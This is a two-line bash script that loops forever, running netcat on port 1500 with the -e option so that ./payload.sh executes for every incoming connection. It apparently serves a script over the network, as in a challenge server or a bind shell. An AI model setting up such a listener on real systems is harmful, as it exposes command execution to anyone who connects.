#!/bin/bash
while true ; do nc -l -p 1500 -e ./payload.sh ; done

